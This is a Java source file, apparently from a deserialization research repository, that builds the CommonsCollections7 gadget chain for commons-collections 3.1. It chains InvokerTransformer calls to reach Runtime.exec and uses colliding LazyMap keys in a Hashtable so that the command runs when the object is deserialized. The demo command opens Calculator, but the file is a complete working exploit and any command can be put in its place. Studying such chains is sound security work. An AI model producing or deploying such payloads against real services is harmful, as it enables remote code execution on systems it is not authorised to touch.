package com.p2hm1n.gadget;

import com.p2hm1n.annotation.Dependencies;
import com.p2hm1n.util.PayloadRunner;
import com.p2hm1n.util.Reflections;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * CommonsCollections7 的 gadget
 * 测试环境 JDK8u45
 *
 * Gadget chain:
 *     java.util.Hashtable.readObject
 *     java.util.Hashtable.reconstitutionPut
 *     org.apache.commons.collections.map.AbstractMapDecorator.equals
 *     java.util.AbstractMap.equals
 *     org.apache.commons.collections.map.LazyMap.get
 *     org.apache.commons.collections.functors.ChainedTransformer.transform
 *     org.apache.commons.collections.functors.InvokerTransformer.transform
 *     java.lang.reflect.Method.invoke
 *     sun.reflect.DelegatingMethodAccessorImpl.invoke
 *     sun.reflect.NativeMethodAccessorImpl.invoke
 *     sun.reflect.NativeMethodAccessorImpl.invoke0
 *     java.lang.Runtime.exec
 */
@Dependencies({"commons-collections:commons-collections:3.1"})
public class CC7 {
    public static void main(String[] args) throws Exception{
        final String[] execArgs = new String[]{ "open -a Calculator" };

        final Transformer transformerChain = new ChainedTransformer(new Transformer[]{});

        final Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec",
                        new Class[]{String.class},
                        execArgs),
                new ConstantTransformer(1)};

        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();

        // Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject
        Map lazyMap1 = LazyMap.decorate(innerMap1, transformerChain);
        lazyMap1.put("yy", 1);

        Map lazyMap2 = LazyMap.decorate(innerMap2, transformerChain);
        lazyMap2.put("zZ", 1);

        // Use the colliding Maps as keys in Hashtable
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 2);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers);

        // Needed to ensure hash collision after previous manipulations
        lazyMap2.remove("yy");
        PayloadRunner.run(hashtable);
    }

}
